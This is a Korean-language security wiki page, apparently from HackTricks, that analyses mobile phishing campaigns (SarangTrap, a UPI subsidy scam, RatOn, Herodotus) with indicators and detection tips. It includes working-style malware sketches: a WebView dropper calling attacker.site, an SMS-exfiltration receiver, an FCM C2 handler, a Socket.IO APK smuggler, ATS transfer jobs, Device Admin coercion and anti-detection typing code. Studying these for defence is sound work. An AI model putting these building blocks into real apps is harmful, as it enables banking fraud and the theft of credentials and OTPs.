# Mobile Phishing & 악성 앱 유포 (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> 이 페이지는 위협 행위자들이 SEO, social engineering, 가짜 스토어, 데이팅 앱 등 phishing을 통해 **malicious Android APKs** 및 **iOS mobile-configuration profiles**를 배포하는 데 사용하는 기법을 다룹니다.
> 자료는 SarangTrap 캠페인( Zimperium zLabs (2025) )과 기타 공개 연구를 기반으로 합니다.

## 공격 흐름

1. **SEO/Phishing Infrastructure**
* 유사 도메인을 수십 개 등록(데이팅, cloud share, car service 등…).
– `<title>` 요소에 현지 언어 키워드와 이모지를 사용해 Google에서 순위를 올림.
– 동일 랜딩 페이지에 Android (`.apk`)와 iOS 설치 지침을 *둘 다* 호스팅.
2. **1차 다운로드**
* Android: 서명되지 않은(unsigned) 또는 “third-party store” APK로의 직접 링크.
* iOS: `itms-services://` 또는 악성 **mobileconfig** 프로파일로의 평문 HTTPS 링크(아래 참조).
3. **설치 후 Social Engineering**
* 최초 실행 시 앱이 **invitation / verification code**(독점 접근 환상)를 요구.
* 코드는 Command-and-Control (C2)에 **HTTP POST**로 전송된다.
* C2가 `{"success":true}`를 응답하면 ➜ malware가 동작을 계속한다.
* 유효한 코드를 제출하지 않는 Sandbox/AV 동적 분석은 **악성 행위 없음**을 관찰(회피).
4. **Runtime Permission Abuse (Android)**
* 위험한 권한은 **C2의 긍정 응답 후에만** 요청된다:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* 최신 변종은 `AndroidManifest.xml`에서 SMS에 대한 `<uses-permission>`을 **제거**하지만 Java/Kotlin의 reflection으로 SMS를 읽는 코드 경로는 남겨둠 ⇒ 정적 점수를 낮추면서도 `AppOps` abuse 또는 오래된 타깃에서 권한이 허용되면 여전히 동작.
5. **위장 UI 및 백그라운드 수집**
* 앱은 로컬로 구현된 무해한 뷰(SMS viewer, gallery picker)를 표시.
* 동시에 다음을 유출:
- IMEI / IMSI, 전화번호
- 전체 `ContactsContract` 덤프(JSON 배열)
- `/sdcard/DCIM`의 JPEG/PNG를 [Luban](https://github.com/Curzibn/Luban)으로 압축하여 크기 축소
- 선택적 SMS 내용(`content://sms`)
페이로드는 **배치로 zip**되어 `HTTP POST /upload.php`로 전송된다.
6. **iOS 전달 기법**
* 하나의 **mobile-configuration profile**로 `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` 등 을 요청해 기기를 “MDM”-유사 감독에 등록시킬 수 있다.
* 사회공학적 지침:
1. 설정 열기 ➜ *Profile downloaded*.
2. *Install*을 세 번 탭(피싱 페이지의 스크린샷 참고).
3. 서명되지 않은 프로파일을 신뢰 ➜ 공격자가 App Store review 없이 *Contacts* 및 *Photo* entitlement를 획득.
7. **네트워크 레이어**
* 평문 HTTP, 종종 포트 80에서 HOST 헤더 예: `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (TLS 없음 → 탐지 쉬움).

## Red-Team 팁

* **Dynamic Analysis Bypass** – 맬웨어 평가 시 Frida/Objection으로 invitation code 단계를 자동화해 악성 분기로 도달.
* **Manifest vs. Runtime Diff** – `aapt dump permissions`와 런타임 `PackageManager#getRequestedPermissions()`를 비교; 위험 권한이 누락된 경우 레드 플래그.
* **Network Canary** – 코드 입력 후 불안정한 POST 폭주를 탐지하려면 `iptables -p tcp --dport 80 -j NFQUEUE` 구성.
* **mobileconfig Inspection** – macOS에서 `security cms -D -i profile.mobileconfig`를 사용해 `PayloadContent`를 나열하고 과도한 entitlements를 찾아라.

## 유용한 Frida 스니펫: 초대 코드 자동 우회

<details>
<summary>Frida: 초대 코드 자동 우회</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## 지표 (일반)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

이 패턴은 정부 혜택 테마를 악용해 인도 UPI 자격증명과 OTP를 탈취하는 캠페인에서 관찰되었습니다. 운영자는 배포와 복원력을 위해 평판 있는 플랫폼들을 연쇄적으로 사용합니다.

### Delivery chain across trusted platforms
- YouTube 비디오 미끼 → 설명에 단축 링크 포함
- 단축 링크 → 정식 포털을 모방한 GitHub Pages 피싱 사이트
- 동일한 GitHub repo는 파일로 직접 연결되는 가짜 “Google Play” 배지가 붙은 APK를 호스팅함
- 동적 피싱 페이지는 Replit에 호스팅되고; 원격 명령 채널은 Firebase Cloud Messaging (FCM)을 사용함

### Dropper with embedded payload and offline install
- 첫 번째 APK는 installer (dropper)로, 실제 악성코드를 `assets/app.apk`로 포함하여 제공하고 클라우드 탐지를 약화시키기 위해 Wi‑Fi/모바일 데이터를 비활성화하도록 사용자에게 요청함.
- 내장된 payload는 무해한 라벨(예: “Secure Update”)로 설치됨. 설치 후에는 설치 프로그램과 payload가 별개의 앱으로 모두 존재함.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### shortlink를 통한 동적 엔드포인트 발견
- Malware는 shortlink에서 평문(plain-text), 쉼표로 구분된 활성 엔드포인트 목록을 가져오며; 간단한 문자열 변환으로 최종 phishing 페이지 경로를 생성합니다.

예시(익명화됨):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
의사 코드:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView 기반 UPI credential harvesting
- “Make payment of ₹1 / UPI‑Lite” 단계에서 동적 엔드포인트로부터 공격자 HTML 폼을 WebView 내부에 로드하여 전화번호, 은행, UPI PIN 같은 민감한 필드를 캡처한 뒤 이를 `addup.php`로 `POST`합니다.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- 처음 실행 시 과도한 권한을 요청함:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- 연락처를 순회하여 피해자 기기에서 smishing SMS를 대량 발송합니다.
- 수신된 SMS는 broadcast receiver에 의해 가로채어져 메타데이터 (sender, body, SIM slot, per-device random ID)와 함께 `/addsm.php`로 업로드됩니다.

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM)을 통한 복원력 있는 C2
- 페이로드는 FCM에 등록되며; 푸시 메시지는 동작을 트리거하는 스위치로 사용되는 `_type` 필드를 포함합니다(예: phishing 텍스트 템플릿 업데이트, 동작 전환).

예시 FCM 페이로드:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler 개요:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### 지표/IOC
- APK에는 보조 페이로드가 포함됨: `assets/app.apk`
- WebView가 `gate.htm`에서 결제 페이지를 로드하고 `/addup.php`로 유출함
- SMS 유출이 `/addsm.php`로 전송됨
- Shortlink 기반 구성 가져오기(예: `rebrand.ly/*`)가 CSV 엔드포인트를 반환함
- 일반적으로 “Update/Secure Update”로 표시된 앱들
- 신뢰할 수 없는 앱에서 `_type` 구분자가 포함된 FCM `data` 메시지

---

## Socket.IO/WebSocket 기반 APK 밀반입 + 가짜 Google Play 페이지

공격자들은 정적 APK 링크를 Google Play처럼 보이는 유인물에 내장된 Socket.IO/WebSocket 채널로 대체하는 경우가 늘고 있다. 이는 페이로드 URL을 숨기고, URL/확장자 필터를 우회하며, 현실적인 설치 UX를 유지한다.

실전에서 관찰된 전형적인 클라이언트 흐름:

<details>
<summary>Socket.IO 가짜 Play 다운로더 (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

간단한 보안 제어를 회피하는 이유:
- 정적 APK URL이 노출되지 않음; 페이로드는 WebSocket 프레임에서 메모리상으로 재구성됨.
- 직접 .apk 응답을 차단하는 URL/MIME/extension 필터는 WebSockets/Socket.IO를 통해 터널링된 바이너리 데이터를 놓칠 수 있음.
- WebSockets를 실행하지 않는 Crawlers 및 URL sandboxes는 페이로드를 가져오지 못함.

참고: WebSocket 관련 기법 및 툴링:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS 자동화, 및 NFC relay 오케스트레이션 – RatOn 사례 연구

RatOn banker/RAT 캠페인(ThreatFabric)은 현대 모바일 피싱 작전이 WebView droppers, Accessibility 기반 UI 자동화, overlays/ransom, Device Admin 강요, Automated Transfer System (ATS), crypto wallet 탈취, 심지어 NFC-relay 오케스트레이션까지 어떻게 결합되는지를 보여주는 대표적인 사례이다. 이 섹션에서는 재사용 가능한 기법들을 추상화하여 설명한다.

### Stage-1: WebView → native install bridge (dropper)

공격자는 공격자 페이지를 가리키는 WebView를 표시하고, 네이티브 설치기를 노출하는 JavaScript 인터페이스를 인젝션한다. HTML 버튼을 탭하면 네이티브 코드가 호출되어 dropper의 assets에 번들된 2단계 APK를 설치하고 바로 실행한다.

최소 패턴:

<details>
<summary>Stage-1 dropper 최소 패턴 (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

페이지의 HTML:
```html
<button onclick="bridge.installApk()">Install</button>
```
설치 후, dropper는 명시적 package/activity를 통해 payload를 실행합니다:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea: 신뢰되지 않은 앱이 `addJavascriptInterface()`를 호출하고 WebView에 설치자와 유사한 메서드를 노출; APK가 `assets/` 아래에 임베디드된 2차 페이로드를 포함하고 Package Installer Session API를 호출하는 경우.

### Consent funnel: Accessibility + Device Admin + follow-on runtime prompts
Stage-2는 WebView를 열어 “Access” 페이지를 호스팅한다. 해당 페이지의 버튼은 export된 메서드를 호출해 피해자를 Accessibility 설정으로 이동시키고 악성 서비스를 활성화하도록 요청한다. 승인되면, 악성코드는 Accessibility를 사용해 이후 런타임 권한 대화상자(contacts, overlay, manage system settings 등)를 자동으로 클릭하고 Device Admin을 요청한다.

- Accessibility는 프로그래밍적으로 node-tree에서 “Allow”/“OK” 같은 버튼을 찾아 클릭을 실행하여 이후 프롬프트를 수락하도록 돕는다.
- Overlay 권한 확인/요청:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
참고:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### WebView를 통한 오버레이 피싱/랜섬
운영자는 다음 명령을 실행할 수 있다:
- URL에서 전체 화면 오버레이를 렌더링하거나,
- WebView 오버레이에 로드되는 인라인 HTML을 전달한다.

가능한 사용 사례: 강요(PIN 입력), PIN을 캡처하기 위한 지갑 열기, 랜섬 메시지 전송. 오버레이 권한이 없는 경우를 대비해 권한을 확인/요청하는 명령을 유지하라.

### 원격 제어 모델 – 텍스트 유사 화면 + 화면 전송
- 저대역폭: 주기적으로 Accessibility node tree를 덤프하고, 보이는 텍스트/roles/bounds를 직렬화하여 의사-스크린으로 C2에 전송한다(예: 한 번 실행하는 `txt_screen`, 지속형 `screen_live` 같은 명령).
- 고충실도: MediaProjection을 요청하고 필요 시 화면 전송/녹화를 시작한다(예: `display` / `record` 같은 명령).

### ATS 플레이북 (bank app automation)
JSON 작업이 주어지면, 은행 앱을 열고 Accessibility를 통해 텍스트 쿼리와 좌표 탭을 혼합해 UI를 제어하며, 요청 시 피해자의 결제 PIN을 입력한다.

예시 작업:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Example texts seen in one target flow (CZ → EN):
- "Nová platba" → "새 결제"
- "Zadat platbu" → "결제 입력"
- "Nový příjemce" → "새 수신자"
- "Domácí číslo účtu" → "국내 계좌 번호"
- "Další" → "다음"
- "Odeslat" → "보내기"
- "Ano, pokračovat" → "예, 계속"
- "Zaplatit" → "결제"
- "Hotovo" → "완료"

Operators can also check/raise transfer limits via commands like `check_limit` and `limit` that navigate the limits UI similarly.

### Crypto wallet seed extraction
Targets like MetaMask, Trust Wallet, Blockchain.com, Phantom. Flow: unlock (stolen PIN or provided password), navigate to Security/Recovery, reveal/show 시드 문구, keylog/exfiltrate it. Implement locale-aware selectors (EN/RU/CZ/SK) to stabilise navigation across languages.

### Device Admin coercion
- Immediate lock:
```java
dpm.lockNow();
```
- 현재 자격 증명을 만료시켜 변경을 강제함 (Accessibility가 새로운 PIN/password를 캡처함):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- keyguard의 생체인증 기능을 비활성화하여 비생체(비-바이오메트릭) 잠금 해제를 강제:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Note: 많은 DevicePolicyManager controls는 최신 Android에서 Device Owner/Profile Owner를 요구합니다; 일부 OEM 빌드는 느슨할 수 있습니다. 항상 대상 OS/OEM에서 검증하세요.

### NFC relay orchestration (NFSkate)
Stage-3는 외부 NFC-relay 모듈(예: NFSkate)을 설치하고 실행할 수 있으며, 릴레이 중 피해자를 안내하기 위한 HTML 템플릿을 전달할 수도 있습니다. 이는 온라인 ATS와 함께 비접촉 카드-프레즌트 현금 인출을 가능하게 합니다.

Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Social: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility-driven ATS anti-detection: human-like text cadence and dual text injection (Herodotus)

위협 행위자들은 접근성(Accessibility) 기반 자동화와 기본 행동 생체인식에 대응하도록 조정된 안티-탐지를 점점 결합하고 있습니다. 최근의 banker/RAT는 두 가지 보완적 텍스트 전달 모드와 무작위화된 타이핑 리듬을 시뮬레이션하는 운영자 토글을 보여줍니다.

- Discovery mode: 조작 전에 셀렉터와 bounds로 보이는 노드를 열거하여 입력을 정확히 타깃(ID, text, contentDescription, hint, bounds).
- Dual text injection:
- Mode 1 – `ACTION_SET_TEXT`를 대상 노드에 직접 적용(안정적, 키보드 없음);
- Mode 2 – 클립보드 설정 + `ACTION_PASTE`로 포커스된 노드에 붙여넣기(직접 setText가 차단될 때 작동).
- Human-like cadence: 운영자가 제공한 문자열을 분할해 이벤트 사이에 무작위화된 300–3000 ms 지연으로 문자 단위로 전달하여 “machine-speed typing” 휴리스틱을 회피합니다. 구현은 `ACTION_SET_TEXT`로 값을 점진적으로 늘리거나 한 문자씩 붙여넣기로 할 수 있습니다.

<details>
<summary>Java 스케치: 노드 검색 + setText 또는 clipboard+paste를 통한 문자별 지연 입력</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

사기 은폐용 차단 오버레이:
- 전체 화면 `TYPE_ACCESSIBILITY_OVERLAY`를 렌더링하고 운영자가 제어하는 불투명도를 적용; 원격 자동화가 배경에서 진행되는 동안 피해자에게는 불투명하게 유지.
- 일반적으로 노출되는 명령: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

조정 가능한 알파 값을 가진 최소 오버레이:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
자주 관찰되는 오퍼레이터 제어 프리미티브: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (screen sharing).

## 참고자료

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)

{{#include ../../banners/hacktricks-training.md}}
